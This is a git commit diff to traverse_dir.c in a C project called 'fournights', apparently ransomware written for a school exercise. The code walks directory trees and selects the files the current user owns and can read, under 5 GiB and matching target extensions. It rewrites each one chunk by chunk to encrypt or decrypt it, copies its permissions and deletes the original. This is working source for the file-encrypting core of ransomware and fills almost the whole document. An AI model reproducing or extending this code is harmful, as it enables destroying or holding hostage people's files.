015200276e09a1311a79fb404a6012b5cd8571d9
ianliu-johnston <ian.liu-johnson@holbertonschool.com>
2017-06-28 01:34:38 -0700

    Refactoring and adding permissions checks

--- src/traverse_dir.c
+++ src/traverse_dir.c
@@ -1,5 +1,27 @@
 #include "fournights.h"
 /**
+  * read_file_by_chunk - helper function for traverse_dir
+  * @filepath: found a file to encrypt or decrypt
+  * @file_info: needed for chmod
+  * @file_filter: Needed for temp bufs
+ **/
+static void read_file_by_chunk(char *filepath, struct stat file_info,
+								file_filter_t *file_filter)
+{
+	tmp_bufs_t *tmp_bufs;
+
+	tmp_bufs = file_filter->tmp_bufs;
+	tmp_bufs->file_info = file_info;
+	do {
+		my_strncat(tmp_bufs->filepath, filepath, 0, my_strlen(filepath));
+		read_file(tmp_bufs->filepath, file_filter, write_file);
+	} while (tmp_bufs->file_offset < tmp_bufs->file_info.st_size);
+	tmp_bufs->file_offset = 0;
+	tmp_bufs->bytes_read = 0;
+	chmod(tmp_bufs->filepath, file_info.st_mode);
+	unlink(filepath);
+}
+/**
   * traverse_dir - Searches through a target directory for all files,
  (* and builds a linked list of those files
   * @dirname: target directory
@@ -24,28 +46,27 @@ void *traverse_dir(char *dirname, file_filter_t *file_filter)
 	{
 		if (my_strncmp(read->d_name, ".", 1) == 0 ||
 			my_strncmp(read->d_name, "..", 2) == 0)
+		{
 			continue;
+		}
 		len_filename = my_strlen(read->d_name);
 		my_strncat(filepath, read->d_name, len_rootpath, len_filename);
 		lstat(filepath, &file_info);
-		if (S_ISDIR(file_info.st_mode) != 0)
+		if (!(file_info.st_mode & S_IRUSR) || /* user has no read permissions? */
+			file_info.st_size > 5368709120 || /* file > 5 GiB? */
+			file_filter->uid != file_info.st_uid) /* user doesn't own file? */
+		{
+			continue;
+		}
+		if (S_ISDIR(file_info.st_mode) != 0) /* file is dir? */
 		{
 			my_strncat(filepath, "/", len_rootpath + len_filename, 1);
-			traverse_dir(filepath, file_filter);
+			traverse_dir(filepath, file_filter); /*TODO:convert recursive to iterative?*/
 		}
 		else if ((search_string(read->d_name, file_filter->file_extensions) != 0) &&
-				S_ISREG(file_info.st_mode) != 0 &&
-				file_info.st_mode & S_IRUSR)
+				S_ISREG(file_info.st_mode) != 0) /* file is a regular file? */
 		{
-			file_filter->tmp_bufs->file_info = file_info;
-			do {
-				my_strncat(file_filter->tmp_bufs->filepath, filepath, 0, my_strlen(filepath));
-				read_file(file_filter->tmp_bufs->filepath, file_filter, write_file);
-			} while (file_filter->tmp_bufs->file_offset < file_filter->tmp_bufs->file_info.st_size);
-			file_filter->tmp_bufs->file_offset = 0;
-			file_filter->tmp_bufs->bytes_read = 0;
-			chmod(file_filter->tmp_bufs->filepath, file_info.st_mode);
-			unlink(filepath);
+			read_file_by_chunk(filepath, file_info, file_filter);
 		}
 	}
 	free(filepath);
